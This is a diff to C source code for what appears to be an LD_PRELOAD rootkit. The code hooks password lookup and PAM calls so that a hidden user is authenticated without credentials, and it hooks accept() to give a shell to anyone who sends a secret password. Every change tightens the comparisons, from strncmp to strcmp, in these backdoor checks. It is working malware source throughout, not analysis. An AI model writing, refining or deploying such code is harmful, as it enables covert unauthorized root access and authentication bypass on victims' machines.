@@ -26,7 +26,7 @@
 /* PAM hooks: */
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
 {
-    if(strncmp(SU_USER, name, strlen(name)) == 0)
+    if(strcmp(SU_USER, name) == 0)
         return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result);
 
     return (int) libcalls[GETPWNAM_R](name, pwd, buf, buflen, result);
@@ -38,7 +38,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
 
     pam_get_item(pamh, PAM_USER, &item);
 
-    if(strncmp(SU_USER, item, strlen(item)) == 0)
+    if(strcmp(SU_USER, item) == 0)
         return PAM_SUCCESS;
 
     return (int) libcalls[PAM_AUTHENTICATE](pamh, flags);
@@ -50,7 +50,7 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
 
     pam_get_item(pamh, PAM_USER, &item);
 
-    if(strncmp(SU_USER, item, strlen(item)) == 0)
+    if(strcmp(SU_USER, item) == 0)
         return PAM_SUCCESS;
 
     return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
@@ -71,7 +71,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
     {
         read(retfd, password, pass_len);
 
-        if(strncmp(password, SHELL_PASS, pass_len) == 0)
+        if(strcmp(password, SHELL_PASS) == 0)
             drop_shell(retfd);
     }
 
